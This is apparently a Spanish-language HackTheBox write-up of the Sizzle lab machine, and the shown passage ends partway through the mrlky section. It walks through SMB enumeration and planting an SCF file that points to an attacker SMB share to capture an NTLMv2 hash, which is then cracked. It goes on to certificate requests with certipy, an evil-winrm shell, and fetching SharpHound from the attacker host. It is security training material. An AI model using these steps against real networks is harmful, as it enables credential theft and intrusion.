@@ -1,0 +1,1250 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex">
+
+  <title>Writeup HackTheBox Sizzle</title>
+
+  <meta name="description" content="Resolución de la máquina Sizzle de la plataforma de HackTheBox">
+  <meta name="author" content="GatoGamer1155">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Writeup HackTheBox Sizzle">
+  <meta name="twitter:description" content="Resolución de la máquina Sizzle de la plataforma de HackTheBox">
+  <meta name="twitter:creator" content="GatoGamer1155">  
+  <meta name="twitter:image" content="/images/htb/sizzle.png" />
+
+  <meta property="og:site_name" content="GatoGamer1155" />
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Writeup HackTheBox Sizzle">
+  <meta property="og:description" content="Resolución de la máquina Sizzle de la plataforma de HackTheBox">
+  <meta property="og:image" content="/images/htb/sizzle.png" />
+
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="/images/htb/sizzle.png">
+
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
+  <link rel="alternate" type="application/rss+xml" title="Writeup HackTheBox Sizzle" href="/feed.xml">
+</head>
+
+  <body style="background-color: #282828;">
+  
+    <span class="mobile btn-mobile-menu">
+      <i class="icon icon-list btn-mobile-menu__icon"></i>
+      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+<header class="panel-cover" style="background-image: url(/images/cover.jpg)">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+
+          <img src="/images/profile.jpg" class="user-image zoomable" alt="GatoGamer1155">
+          <h1 class="panel-cover__title panel-title scale-up-center">GatoGamer1155</h1>
+
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description slide-top">Entusiasta del Hacking y CTFs</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+         <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item grow"><a href="/htb" title="GatoGamer1155" class="blog-button">HackTheBox</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+              
+              <li class="navigation__item grow">
+                <a href="https://github.com/gatogamer1155" title="Github" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://twitter.com/gatogamer1155" title="Twitter" target="_blank">
+                  <i class="icon icon-social-twitter"></i>
+                  <span class="label">Twitter</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://instagram.com/gatogamer1155" title="Instagram" target="_blank">
+                  <i class="icon icon-social-instagram"></i>
+                  <span class="label">Instagram</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://youtube.com/@gatogamer1155" title="Youtube" target="_blank">
+                  <i class="icon icon-social-youtube"></i>
+                  <span class="label">Youtube</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="mailto:gatogamer1155@gmail.com" title="Correo Electronico" target="_blank">
+                  <i class="icon icon-mail"></i>
+                  <span class="label">Email</span>
+                </a>
+              </li>
+
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+    <br>
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+    <div class="izquierda">
+      <h3 class="post-title">Contenido</h3><br>
+      <ul>
+        <li><a href="#enumeration">Enumeración</a></li>
+        <li><a href="#access-amanda">Access - amanda</a></li>
+        <li><a href="#shell-amanda">Shell - amanda</a></li>
+        <li><a href="#shell-mrlky">Shell - mrlky</a></li>
+        <li><a href="#shell-administrator">Shell - Administrator</a></li>
+        <li><a href="#extra1-administrator">Extra 1 - Administrator</a></li>
+        <li><a href="#extra2-administrator">Extra 2 - Administrator</a></li>
+        <li><a href="#extra3-administrator">Extra 3 - Administrator</a></li>
+        <li><a href="#extra4-administrator">Extra 4 - Administrator</a></li>
+        <li><a href="#extra5-administrator">Extra 5 - Administrator</a></li>
+      </ul>
+  </div>
+
+  <header class="post-header slide-top">
+    <h4 class="post-title">HackTheBox</h4>
+    <picture><img src="/images/htb/sizzle.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
+    <h2 class="post-title">Sizzle</h2><br>
+  </header>
+  
+<section class="post" id="enumeration">
+<br><h3 class="post-title">Enumeración</h3><br>
+
+<p class="plain-text">Iniciamos la máquina escaneando los puertos de la máquina con <code class="language-plaintext highlighter-rouge">nmap</code> donde encontramos varios puertos abiertos, entre ellos el <code class="language-plaintext highlighter-rouge">80</code> que corre un servicio <code class="language-plaintext highlighter-rouge">http</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ nmap </span><span class="p">10.10.10.103
+Nmap scan report for 10.10.10.103  
+PORT      STATE SERVICE
+21/tcp    open  ftp
+53/tcp    open  domain
+80/tcp    open  http
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+443/tcp   open  https
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+5986/tcp  open  wsmans
+9389/tcp  open  adws
+47001/tcp open  winrm
+49664/tcp open  unknown
+49665/tcp open  unknown
+49666/tcp open  unknown
+49669/tcp open  unknown
+49671/tcp open  unknown
+49688/tcp open  unknown
+49689/tcp open  unknown
+49692/tcp open  unknown
+49695/tcp open  unknown
+49700/tcp open  unknown
+49713/tcp open  unknown</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Con <code class="language-plaintext highlighter-rouge">crackmapexec</code> podemos obtener información de la maquina asi como el <code class="language-plaintext highlighter-rouge">dominio</code> que es <code class="language-plaintext highlighter-rouge">htb.local</code> ademas del nombre de la maquina que es <code class="language-plaintext highlighter-rouge">SIZZLE</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb 10.10.10.103
+</span><span class="az">SMB         </span><span class="p">10.10.10.103  445    SIZZLE           </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 14393 x64 (name:SIZZLE) (domain:HTB.LOCAL) (signing:True) (SMBv1:False)  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para posibles proximos ataques o solo por comodidad agregaremos el <code class="language-plaintext highlighter-rouge">dominio</code> al <code class="language-plaintext highlighter-rouge">/etc/hosts</code> ademas el <code class="language-plaintext highlighter-rouge">nombre</code> de la máquina que es <code class="language-plaintext highlighter-rouge">SIZZLE</code> como otro dominio</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ echo </span><span class="am">"10.10.10.103 htb.local sizzle.htb.local"</span><span class="p"> | </span><span class="ve">sudo tee</span><span class="p"> -a /etc/hosts  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">El servicio <code class="language-plaintext highlighter-rouge">ftp</code> se encuentra abierto y acepta una autenticacion por defecto como el usuario <code class="language-plaintext highlighter-rouge">anonymous</code>, sin embargo no encontramos nada interesante en este</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ftp </span><span class="p">htb.local
+Connected to htb.local.
+220 Microsoft FTP Service
+Name (htb.local:kali): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.  
+Password:
+230 User logged in.
+Remote system type is Windows_NT.
+ftp> dir
+229 Entering Extended Passive Mode (|||54665|)
+125 Data connection already open; Transfer starting.
+226 Transfer complete.
+ftp></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La página web principal tampoco nos aporta nada, solo es un <code class="language-plaintext highlighter-rouge">gif</code> sin mucho sentido</p>
+<a href="/htb/sizzle/1.png" target="_blank"><div><p><img src="/htb/sizzle/1.png"></p></div></a>
+
+<p class="plain-text">Enumerando recursos <code class="language-plaintext highlighter-rouge">smb</code> compartidos desde una sesion nula tenemos privilegios <code class="language-plaintext highlighter-rouge">READ</code> o de lectura en el recurso <code class="language-plaintext highlighter-rouge">Department Shares</code> que no viene por defecto</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb htb.local -u null -p </span><span class="am">''</span><span class="p"> --shares
+</span><span class="az">SMB         </span><span class="p">htb.local       445    SIZZLE           </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 14393 x64 (name:SIZZLE) (domain:HTB.LOCAL) (signing:True) (SMBv1:False)
+</span><span class="az">SMB         </span><span class="p">htb.local       445    SIZZLE           </span><span class="ve">[+] </span><span class="p">HTB.LOCAL\null:
+</span><span class="az">SMB         </span><span class="p">htb.local       445    SIZZLE           </span><span class="ve">[+] </span><span class="p">Enumerated shares
+</span><span class="az">SMB         </span><span class="p">htb.local       445    SIZZLE           </span><span class="am">Share              Permissions     Remark
+</span><span class="az">SMB         </span><span class="p">htb.local       445    SIZZLE           </span><span class="am">-----              -----------     ------
+</span><span class="az">SMB         </span><span class="p">htb.local       445    SIZZLE           </span><span class="am">ADMIN$                             Remote Admin
+</span><span class="az">SMB         </span><span class="p">htb.local       445    SIZZLE           </span><span class="am">C$                                 Default share
+</span><span class="az">SMB         </span><span class="p">htb.local       445    SIZZLE           </span><span class="am">CertEnroll                         Active Directory Certificate Services share
+</span><span class="az">SMB         </span><span class="p">htb.local       445    SIZZLE           </span><span class="am">Department Shares  READ
+</span><span class="az">SMB         </span><span class="p">htb.local       445    SIZZLE           </span><span class="am">IPC$               READ            Remote IPC
+</span><span class="az">SMB         </span><span class="p">htb.local       445    SIZZLE           </span><span class="am">NETLOGON                           Logon server share
+</span><span class="az">SMB         </span><span class="p">htb.local       445    SIZZLE           </span><span class="am">Operations
+</span><span class="az">SMB         </span><span class="p">htb.local       445    SIZZLE           </span><span class="am">SYSVOL                             Logon server share</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos conectarnos con <code class="language-plaintext highlighter-rouge">smbclient</code> y dentro encontramos varios directorios</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-smbclient </span><span class="p">htb.local/null@sizzle.htb.local -no-pass
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+Type help for list of commands
+# use Department Shares
+# ls
+drw-rw-rw-          0  Tue Jul  3 10:22:32 2018 .
+drw-rw-rw-          0  Tue Jul  3 10:22:32 2018 ..
+drw-rw-rw-          0  Mon Jul  2 14:21:43 2018 Accounting
+drw-rw-rw-          0  Mon Jul  2 14:14:28 2018 Audit
+drw-rw-rw-          0  Tue Jul  3 10:22:39 2018 Banking
+drw-rw-rw-          0  Mon Jul  2 14:15:01 2018 CEO_protected
+drw-rw-rw-          0  Mon Jul  2 14:22:06 2018 Devops
+drw-rw-rw-          0  Mon Jul  2 14:11:57 2018 Finance
+drw-rw-rw-          0  Mon Jul  2 14:16:11 2018 HR
+drw-rw-rw-          0  Mon Jul  2 14:14:24 2018 Infosec
+drw-rw-rw-          0  Mon Jul  2 14:13:59 2018 Infrastructure  
+drw-rw-rw-          0  Mon Jul  2 14:12:04 2018 IT
+drw-rw-rw-          0  Mon Jul  2 14:12:09 2018 Legal
+drw-rw-rw-          0  Mon Jul  2 14:15:25 2018 M&A
+drw-rw-rw-          0  Mon Jul  2 14:14:43 2018 Marketing
+drw-rw-rw-          0  Mon Jul  2 14:11:47 2018 R&D
+drw-rw-rw-          0  Mon Jul  2 14:14:37 2018 Sales
+drw-rw-rw-          0  Mon Jul  2 14:21:46 2018 Security
+drw-rw-rw-          0  Mon Jul  2 14:16:54 2018 Tax
+drw-rw-rw-          0  Tue Jul 10 16:39:32 2018 Users
+drw-rw-rw-          0  Mon Jul  2 14:32:58 2018 ZZ_ARCHIVE
+#</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Dentro del directorio <code class="language-plaintext highlighter-rouge">ZZ_ARCHIVE</code> encontramos muchos archivos de diferentes extensiones, podemos descargar todos usando <code class="language-plaintext highlighter-rouge">mget</code> para despues analizarlos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p"># cd ZZ_ARCHIVE
+# mget *
+[*] Downloading AddComplete.pptx
+[*] Downloading AddMerge.ram
+[*] Downloading ConfirmUnprotect.doc
+[*] Downloading ConvertFromInvoke.mov
+[*] Downloading ConvertJoin.docx
+[*] Downloading CopyPublish.ogg
+[*] Downloading DebugMove.mpg
+[*] Downloading DebugSelect.mpg
+[*] Downloading DebugUse.pptx
+[*] Downloading DisconnectApprove.ogg
+[*] Downloading DisconnectDebug.mpeg2
+[*] Downloading EditCompress.xls
+.....................................  
+[*] Downloading ResumeCompare.doc
+[*] Downloading SelectPop.ogg
+[*] Downloading SuspendWatch.mp4
+[*] Downloading SwitchConvertFrom.mpg
+[*] Downloading UndoPing.rm
+[*] Downloading UninstallExpand.mp3
+[*] Downloading UnpublishSplit.ppt
+[*] Downloading UnregisterPing.pptx
+[*] Downloading UpdateRead.mpeg
+[*] Downloading WaitRevoke.pptx
+[*] Downloading WriteUninstall.mp3
+#</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Realmente no nos aportan nada, si revisamos un archivo todos los bytes son <code class="language-plaintext highlighter-rouge">00</code> y el hash <code class="language-plaintext highlighter-rouge">md5</code> de todos los archivos es el mismo, asi que solo son <code class="language-plaintext highlighter-rouge">null bytes</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ xxd </span><span class="p">WriteUninstall.mp3 | </span><span class="ve">head</span><span class="p"> -n1
+00000000: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+
+</span><span class="ve">❯ md5sum </span><span class="p">*
+6fa74ff6dd88878b4b56092a950035f8  AddComplete.pptx
+6fa74ff6dd88878b4b56092a950035f8  AddMerge.ram
+6fa74ff6dd88878b4b56092a950035f8  ConfirmUnprotect.doc
+6fa74ff6dd88878b4b56092a950035f8  ConvertFromInvoke.mov
+6fa74ff6dd88878b4b56092a950035f8  ConvertJoin.docx
+6fa74ff6dd88878b4b56092a950035f8  CopyPublish.ogg
+6fa74ff6dd88878b4b56092a950035f8  DebugMove.mpg
+6fa74ff6dd88878b4b56092a950035f8  DebugSelect.mpg
+6fa74ff6dd88878b4b56092a950035f8  DebugUse.pptx
+6fa74ff6dd88878b4b56092a950035f8  DisconnectApprove.ogg
+6fa74ff6dd88878b4b56092a950035f8  DisconnectDebug.mpeg2
+6fa74ff6dd88878b4b56092a950035f8  EditCompress.xls
+.......................................................</span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="access-amanda">
+<br><h3 class="post-title">Access - amanda</h3><br>
+
+<p class="plain-text">En el directorio <code class="language-plaintext highlighter-rouge">Users</code> encontramos a diferentes usuarios probablemente del sistema</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p"># cd Users
+# ls
+drw-rw-rw-          0  Tue Jul 10 16:39:32 2018 .
+drw-rw-rw-          0  Tue Jul 10 16:39:32 2018 ..
+drw-rw-rw-          0  Mon Jul  2 14:18:43 2018 amanda
+drw-rw-rw-          0  Mon Jul  2 14:19:06 2018 amanda_adm  
+drw-rw-rw-          0  Mon Jul  2 14:18:28 2018 bill
+drw-rw-rw-          0  Mon Jul  2 14:18:31 2018 bob
+drw-rw-rw-          0  Mon Jul  2 14:19:14 2018 chris
+drw-rw-rw-          0  Mon Jul  2 14:18:39 2018 henry
+drw-rw-rw-          0  Mon Jul  2 14:18:34 2018 joe
+drw-rw-rw-          0  Mon Jul  2 14:18:53 2018 jose
+drw-rw-rw-          0  Tue Jul 10 16:39:32 2018 lkys37en
+drw-rw-rw-          0  Mon Jul  2 14:18:48 2018 morgan
+drw-rw-rw-          0  Mon Jul  2 14:19:20 2018 mrb3n
+drw-rw-rw-          0  Wed Sep 26 00:45:32 2018 Public
+#</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Con <code class="language-plaintext highlighter-rouge">smbcacls</code> podemos ver los privilegios exactos que tenemos sobre cada carpeta del recurso compartido, especificamente nos interesa el campo <code class="language-plaintext highlighter-rouge">Everyone</code> ya que son los privilegios que tenemos desde la <code class="language-plaintext highlighter-rouge">null</code> session en el contexto en que estamos</o>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ smbcacls </span><span class="p">-N </span><span class="am">"//htb.local/Department Shares" "Users/amanda"</span><span class="p">
+REVISION:1
+CONTROL:SR|DI|DP
+OWNER:BUILTIN\Administrators
+GROUP:HTB\Domain Users
+ACL:S-1-5-21-2379389067-1826974543-3574127760-1000:ALLOWED/OI|CI|I/FULL
+ACL:BUILTIN\Administrators:ALLOWED/OI|CI|I/FULL
+ACL:Everyone:ALLOWED/OI|CI|I/READ
+ACL:NT AUTHORITY\SYSTEM:ALLOWED/OI|CI|I/FULL</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">A traves de un <code class="language-plaintext highlighter-rouge">bucle</code> iterando por cada uno de los directorios de usuario podemos revisar los privilegios de <code class="language-plaintext highlighter-rouge">Everyone</code>, en la carpeta <code class="language-plaintext highlighter-rouge">Public</code> tenemos privilegio <code class="language-plaintext highlighter-rouge">FULL</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ </span><span class="am">for </span><span class="p">user in </span><span class="sa">$(</span><span class="ve">cat </span><span class="p">users.txt</span><span class="sa">)</span><span class="p">; </span><span class="am">do </span><span class="ve">echo</span><span class="p"> -n </span><span class="am">"Users/</span><span class="az">$user</span><span class="am">: "</span><span class="p">; </span><span class="ve">smbcacls</span><span class="p"> -N </span><span class="am">"//htb.local/Department Shares" "Users/</span><span class="az">$user</span><span class="am">"</span><span class="p"> | </span><span class="ve">grep </span><span class="p">Everyone; </span><span class="am">done</span><span class="p">  
+Users/amanda: ACL:</span><span class="ro">Everyone</span><span class="p">:ALLOWED/OI|CI|I/READ
+Users/amanda_adm: ACL:</span><span class="ro">Everyone</span><span class="p">:ALLOWED/OI|CI|I/READ
+Users/bill: ACL:</span><span class="ro">Everyone</span><span class="p">:ALLOWED/OI|CI|I/READ
+Users/bob: ACL:</span><span class="ro">Everyone</span><span class="p">:ALLOWED/OI|CI|I/READ
+Users/chris: ACL:</span><span class="ro">Everyone</span><span class="p">:ALLOWED/OI|CI|I/READ
+Users/henry: ACL:</span><span class="ro">Everyone</span><span class="p">:ALLOWED/OI|CI|I/READ
+Users/joe: ACL:</span><span class="ro">Everyone</span><span class="p">:ALLOWED/OI|CI|I/READ
+Users/jose: ACL:</span><span class="ro">Everyone</span><span class="p">:ALLOWED/OI|CI|I/READ
+Users/lkys37en: ACL:</span><span class="ro">Everyone</span><span class="p">:ALLOWED/OI|CI|I/READ
+Users/morgan: ACL:</span><span class="ro">Everyone</span><span class="p">:ALLOWED/OI|CI|I/READ
+Users/mrb3n: ACL:</span><span class="ro">Everyone</span><span class="p">:ALLOWED/OI|CI|I/READ
+Users/Public: ACL:</span><span class="ro">Everyone</span><span class="p">:ALLOWED/OI|CI/FULL</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Un posible ataque como en <a href="/htb/driver/">Driver</a> es cargar un archivo <code class="language-plaintext highlighter-rouge">scf</code> para cuando un usuario intente ver el <code class="language-plaintext highlighter-rouge">icono</code> este se carge de un recurso <code class="language-plaintext highlighter-rouge">smb</code> externo que crearemos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">[</span><span class="na">Shell</span><span class="p">]
+</span><span class="o">IconFile</span><span class="p">=</span><span class="s">\\10.10.14.10\kali\pwned.ico  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Simplemente nos conectamos con smbclient subimos el <code class="language-plaintext highlighter-rouge">scf</code> al directorio <code class="language-plaintext highlighter-rouge">Public</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-smbclient </span><span class="p">htb.local/null@sizzle.htb.local -no-pass  
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+Type help for list of commands
+# use Department Shares
+# cd Users\Public
+# put file.scf
+#</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Despues de unos segundos recibimos un <code class="language-plaintext highlighter-rouge">hash</code> NTLMv2 perteneciente a <code class="language-plaintext highlighter-rouge">amanda</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-smbserver </span><span class="p">kali . -smb2support
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+[*] Incoming connection (10.10.10.103,53037)
+[*] AUTHENTICATE_MESSAGE (HTB\amanda,SIZZLE)
+[*] User SIZZLE\amanda authenticated successfully
+[*] amanda::HTB:aaaaaaaaaaaaaaaa:cdc61f6dec08fc4c6b29cbd23c0ef801:0101000000000000808f118b18d3d9011528d60c45e443e000000000010010004d006b006b0063004700490041007400030010004d006b006b00630047004900410074000200100043005900660063006200710079004200040010004300590066006300620071007900420007000800808f118b18d3d9010600040002000000080030003000000000000000010000000020000044545fcb6ad84fa298ce8e914d1f888b0021bae9cdd79032f9f3221b5963c43d0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e003600000000000000000000000000  
+[*] Connecting Share(1:IPC$)
+[*] Connecting Share(2:kali)
+[*] Disconnecting Share(1:IPC$)
+[*] Disconnecting Share(2:kali)
+[*] Closing down connection (10.10.10.103,53037)
+[*] Remaining connections []</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La contraseña es debil por lo tanto podemos crackearla facilmente usando <code class="language-plaintext highlighter-rouge">john</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ john </span><span class="p">-w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+</span><span class="am">Ashare1972</span><span class="p">       (</span><span class="am">amanda</span><span class="p">)
+Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably  
+Session completed.</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Comprobamos la contraseña del usuario <code class="language-plaintext highlighter-rouge">amanda</code> en SMB usando <code class="language-plaintext highlighter-rouge">crackmapexec</code> y nos devuelve que es valida, ahora tenemos credenciales a nivel de dominio</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb htb.local -u amanda -p Ashare1972
+</span><span class="az">SMB         </span><span class="p">htb.local       445    SIZZLE           </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 14393 x64 (name:SIZZLE) (domain:HTB.LOCAL) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">htb.local       445    SIZZLE           </span><span class="ve">[+] </span><span class="p">HTB.LOCAL\amanda:Ashare1972</span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="shell-amanda">
+<br><h3 class="post-title">Shell - amanda</h3><br>
+
+<p class="plain-text">Al intentar autenticarnos a <code class="language-plaintext highlighter-rouge">winrm</code> nos devuelve un error, pero no es de autenticacion sino de problemas del servidor que no responde en <code class="language-plaintext highlighter-rouge">NTLM</code> ni por <code class="language-plaintext highlighter-rouge">Kerberos</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">winrm htb.local -u amanda -p Ashare1972 
+</span><span class="az">SMB         </span><span class="p">htb.local       5986   SIZZLE           </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 14393 (name:SIZZLE) (domain:HTB.LOCAL)
+</span><span class="az">HTTP        </span><span class="p">htb.local       5986   SIZZLE           </span><span class="az">[*] </span><span class="p">https://htb.local:5986/wsman
+</span><span class="az">WINRM       </span><span class="p">htb.local       5986   SIZZLE           </span><span class="ro">[-] </span><span class="p">HTB.LOCAL\amanda:Ashare1972 "The server did not response with one of the following authentication methods Negotiate, Kerberos, NTLM - actual: ''"</span>  
+</code></pre></div></div><br>
+
+<p class="plain-text">Lo que podemos hacer es autenticarnos con un certificado y una clave, para ello iniciamos obteniendo un <code class="language-plaintext highlighter-rouge">pfx</code> con certipy pero antes necesitamos conocer el <code class="language-plaintext highlighter-rouge">CA</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ certipy </span><span class="p">find -target htb.local -u amanda -p Ashare1972
+Certipy v4.7.0 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 35 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 13 enabled certificate templates
+[*] Trying to get CA configuration for 'HTB-SIZZLE-CA' via CSRA  
+[*] Trying to get CA configuration for 'HTB-SIZZLE-CA' via RRP
+[*] Got CA configuration for 'HTB-SIZZLE-CA'
+[-] Got error: module 'enum' has no attribute '_decompose'
+[-] Use -debug to print a stacktrace</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ya con el CA obtenemos el <code class="language-plaintext highlighter-rouge">pfx</code> como amanda y extraemos de este el <code class="language-plaintext highlighter-rouge">crt</code> y el <code class="language-plaintext highlighter-rouge">key</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ certipy </span><span class="p">req -target htb.local -u amanda -p Ashare1972 -ca HTB-SIZZLE-CA  
+Certipy v4.7.0 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Request ID is 23
+[*] Got certificate with UPN 'amanda@HTB.LOCAL'
+[*] Certificate has no object SID
+[*] Saved certificate and private key to 'amanda.pfx'
+
+</span><span class="ve">❯ certipy </span><span class="p">cert -pfx amanda.pfx -nokey -out amanda.crt
+Certipy v4.7.0 - by Oliver Lyak (ly4k)
+
+[*] Writing certificate and  to 'amanda.crt'
+
+</span><span class="ve">❯ certipy </span><span class="p">cert -pfx amanda.pfx -nocert -out amanda.key
+Certipy v4.7.0 - by Oliver Lyak (ly4k)
+
+[*] Writing private key to 'amanda.key'</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Con el .crt y el .key que generamos con <code class="language-plaintext highlighter-rouge">certipy</code> para el usuario <code class="language-plaintext highlighter-rouge">amanda</code> podemos conectarnos con <code class="language-plaintext highlighter-rouge">evil-winrm</code> por <code class="language-plaintext highlighter-rouge">SSL</code> y obtener una powershell como amanda</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ evil-winrm </span><span class="p">-S -i htb.local -c amanda.crt -k amanda.key  
+PS C:\Users\amanda\Documents> </span><span class="am">whoami</span><span class="p">
+htb\amanda
+PS C:\Users\amanda\Documents></span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="shell-mrlky">
+<br><h3 class="post-title">Shell - mrlky</h3><br>
+
+<p class="plain-text">Si intentamos importar el modulo de <a href="https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1">SharpHound</a> usando <code class="language-plaintext highlighter-rouge">Import-Module</code> nos salta un error diciendo que no podemos importar <code class="language-plaintext highlighter-rouge">scripts</code> en este contexto de modo</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\amanda\Documents> </span><span class="am">curl </span><span class="p">10.10.14.10/SharpHound.ps1 </span><span class="c1">-o </span><span class="p">SharpHound.ps1
+PS C:\Users\amanda\Documents> </span><span class="am">Import-Module </span><span class="p">.\SharpHound.ps1
+</span><span class="ro">Importing *.ps1 files as modules is not allowed in ConstrainedLanguage mode.
+At line:1 char:1
++ Import-Module .\SharpHound.ps1
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : PermissionDenied: (:) [Import-Module], InvalidOperationException
+    + FullyQualifiedErrorId : Modules_ImportPSFileNotAllowedInConstrainedLanguage,Microsoft.PowerShell.Commands.ImportModuleCommand  </span><span class="p">
+PS C:\Users\amanda\Documents></span>
+</code></pre></div></div><br>
+
